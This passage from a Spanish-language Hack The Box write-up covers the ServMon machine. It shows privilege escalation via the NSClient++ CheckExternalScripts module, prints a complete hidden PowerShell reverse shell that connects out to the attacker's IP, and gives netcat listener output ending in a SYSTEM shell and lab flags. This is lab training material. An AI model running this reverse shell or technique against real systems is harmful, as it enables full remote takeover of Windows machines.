&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ sudo nc -lvp &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.3&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from 10.10.10.184 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.184&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;52222&lt;/span&gt;
Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.18363.752&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; Microsoft Corporation. All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;SClient++&amp;gt;whoami
whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;SClient++&amp;gt;type &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\Administrator\Desktop\root.txt&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\Administrator\Desktop\root.txt&amp;#34;&lt;/span&gt;
0f4b1f505e07879477a1ebdd7bccb170
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;checkexternalscripts-2&#34;&gt;CheckExternalScripts [2]&lt;/h2&gt;
&lt;p&gt;Creamos una &lt;a href=&#34;https://www.revshells.com/&#34;&gt;shell inversa&lt;/a&gt; con powershell y colocamos el puerto 80 a la escucha con netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;powershell -nop -W hidden -noni -ep bypass -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TCPClient&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = New-Object Net.Sockets.TCPClient(&amp;#39;10.10.14.17&amp;#39;, 80);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NetworkStream&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TCPClient&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.GetStream();&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = New-Object IO.StreamWriter(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NetworkStream&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;);function WriteToStream (&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$String&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;) {[byte[]]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$script&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:Buffer = 0..&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TCPClient&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.ReceiveBufferSize | % {0};&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Write(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$String&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; + &amp;#39;SHELL&amp;gt; &amp;#39;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Flush()}WriteToStream &amp;#39;&amp;#39;;while((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$BytesRead&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NetworkStream&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Read(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Buffer&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, 0, &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Buffer&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Length)) -gt 0) {&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Command&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = ([text.encoding]::UTF8).GetString(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Buffer&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, 0, &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$BytesRead&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; - 1);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Output&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = try {Invoke-Expression &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Command&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 2&amp;gt;&amp;amp;1 | Out-String} catch {&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; | Out-String}WriteToStream (&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Output&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Close()&amp;#34;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# œÄ ~/htb/servmon ‚ùØ sudo nc -lvp 80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para obtener una shell utilizamos unicamente el modulo &lt;code&gt;CheckExternalScripts&lt;/code&gt; el cual contiene la opcion en configuracion del modulo para ejecutar comando. Nos dirigimos a modulos donde encontramos CheckExternalScripts y en configuraciones de &lt;code&gt;/settings/external scripts/scripts/default&lt;/code&gt; agregamos en &lt;strong&gt;command&lt;/strong&gt; nuestra shell inversa. Regresamos nuevamente al modulo CheckExternalScripts, desactivamos y activamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_36_50-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_37_44-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_38_41-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_51_15-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Lo cual ejecutar√° el comando previiamente creado (shell inversa) y con el logramos obtener una shell &lt;code&gt;nt authority\system&lt;/code&gt; y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ sudo nc -lvp &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.17&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from 10.10.10.184 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.184&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;56431&lt;/span&gt;
SHELL&amp;gt; whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem
SHELL&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
SHELL&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       13/05/2021     06:55             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; root.txt


SHELL&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; root.txt
034e2552b8082e806157bff19bab470c
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://assets.nagios.com/downloads/nagiosxi/docs/Configuring-The-Windows-Agent-NSClient++-for-Nagios-XI.pdf&#34;&gt;NSClient++ Windows Conf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>Dany Sucuc</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/servmon/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/servmon/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>ftp</category>
            
          
            
              <category>smb</category>
            
          
            
              <category>crackmapexec</category>
            
          
            
              <category>nsclient&#43;&#43;</category>
            
          
            
              <category>powershell</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>